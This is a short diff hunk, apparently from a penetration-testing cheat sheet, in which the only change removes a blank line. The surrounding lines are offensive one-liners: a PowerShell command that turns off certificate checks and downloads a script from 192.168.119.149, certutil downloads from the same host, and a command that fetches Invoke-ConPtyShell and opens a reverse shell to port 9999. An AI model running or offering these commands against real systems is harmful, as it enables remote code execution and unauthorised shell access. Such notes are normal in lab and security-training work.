@@ -16,7 +16,6 @@ functions:
 		Ignore Cert Trusts
 		powershell -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;(New-Object System.Net.WebClient).DownloadString('https://192.168.119.149:8000/Invoke-TM.ps1')
 
-
         +++++++++certutil+++++++++
         certutil.exe -urlcache -f http://192.168.119.149:8000/task.xml task.xml
         certutil.exe -urlcache -f http://192.168.119.149:8000/Invoke-ConPtyShell.ps1 Invoke-ConPtyShell.ps1; Invoke-ConPtyShell 192.168.119.149 9999
